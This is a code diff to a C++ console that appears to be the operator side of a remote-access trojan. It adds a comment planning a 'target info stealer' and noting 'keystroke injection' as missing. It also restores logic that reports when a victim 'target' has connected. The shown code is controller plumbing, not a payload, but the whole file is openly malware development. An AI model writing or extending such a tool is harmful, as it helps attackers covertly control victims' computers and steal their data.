@@ -1,3 +1,11 @@
+/*
+
+    console 
+    no keystroke injection
+    need to add target info stealer
+
+*/
+
 // cl /EHsc .\console.cpp /link ws2_32.lib /OUT:console.exe  
 #include <winsock2.h>
 #include <iostream>
@@ -55,18 +63,18 @@ int main(int argc, char *argv[])
 
                 string connected_target = receive_data(sock,"target_name.rat");
 
-                // if(connected_target[0] == '`')
-                // {
-                //     cout << ">> No targets connected!" << endl;
-                //     system("pause");
-                //     break;
-                // }
-                // else 
-                // {
-                    targetconnected = true;
-                    cout << ">> Target connected: " ;//<< connected_target << endl;
+                if(connected_target[0] == '`')
+                {
+                    cout << ">> No targets connected!" << endl;
                     system("pause");
-                //}
+                    break;
+                }
+                else 
+                {
+                    targetconnected = true;
+                    cout << ">> Target connected: " << connected_target << endl;
+                    system("pause");
+                }
                 break;
             }
 
